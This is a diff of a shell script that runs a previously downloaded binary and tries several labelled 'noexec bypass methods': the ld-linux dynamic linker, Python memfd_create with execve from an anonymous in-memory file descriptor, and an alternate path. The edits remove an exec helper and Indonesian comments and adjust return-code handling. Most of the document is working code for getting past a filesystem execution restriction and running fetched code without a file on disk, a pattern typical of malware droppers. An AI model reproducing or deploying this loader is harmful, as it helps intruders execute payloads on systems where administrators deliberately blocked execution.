@@ -56,22 +56,12 @@ log "downloaded $size bytes"
 log "chmod +x $tmp"
 chmod +x "$tmp" || log "WARNING: chmod failed (likely noexec), will try fallback methods"
 
-# ---- exec helper ----
-do_exec() {
-  local bin="$1"; shift
-  if [ -e /dev/tty ]; then
-    exec "$bin" "$@" </dev/tty
-  else
-    exec "$bin" "$@"
-  fi
-}
-
 # ---- run with noexec fallback methods ----
 run_binary() {
   local bin="$1"
   shift
 
-  # Method 1: direct exec (normal path)
+  # Method 1: direct exec
   log "method 1: direct exec"
   if [ -e /dev/tty ]; then
     "$bin" "$@" </dev/tty && return 0
@@ -82,7 +72,6 @@ run_binary() {
   log "direct exec failed, trying noexec bypass methods..."
 
   # Method 2: ld-linux dynamic linker
-  # Hanya efektif jika binary dynamically linked DAN kernel tidak enforce noexec di mmap
   log "method 2: ld-linux dynamic linker"
   if command -v readelf >/dev/null 2>&1 && readelf -d "$bin" 2>/dev/null | grep -q NEEDED; then
     for ld in \
@@ -105,7 +94,7 @@ run_binary() {
   fi
 
   # Method 3: Python memfd_create (anonymous in-memory fd, tidak terikat filesystem)
-  # PENTING: tidak ada </dev/tty di baris python — heredoc butuh stdin
+  # Tidak ada </dev/tty di sini — heredoc butuh stdin
   # /dev/tty dibuka ulang di dalam Python sebelum execve
   log "method 3: Python memfd_create"
   for py in python3 python python2; do
@@ -122,8 +111,6 @@ with open(bin_path, 'rb') as f:
     data = f.read()
 sys.stderr.write('[memfd] read %d bytes\n' % len(data))
 
-# os.memfd_create tersedia di Python >= 3.8
-# fallback ke syscall langsung untuk Python 3.6 / 2.x
 fd = -1
 try:
     fd = os.memfd_create("anon", 0)
@@ -150,7 +137,6 @@ if fd < 0:
 sys.stderr.write('[memfd] fd=%d, writing binary...\n' % fd)
 os.write(fd, data)
 
-# Reopen /dev/tty sebagai stdin agar binary bisa interaktif setelah execve
 try:
     tty = os.open('/dev/tty', os.O_RDWR)
     os.dup2(tty, 0)
@@ -162,7 +148,8 @@ except OSError as e:
 sys.stderr.write('[memfd] execve /proc/self/fd/%d\n' % fd)
 os.execve('/proc/self/fd/%d' % fd, args, os.environ)
 PYEOF
-      && return 0
+      py_ret=$?
+      [ $py_ret -eq 0 ] && return 0
     fi
   done
 
@@ -192,7 +179,7 @@ PYEOF
 
 # ---- main ----
 log "executing $tmp $*"
-log "(noexec-aware: will try ld.so → memfd → alt-path as fallback)"
+log "(noexec-aware: direct → ld.so → memfd → alt-path)"
 log "------------------------------------------------------------"
 
 run_binary "$tmp" "$@"
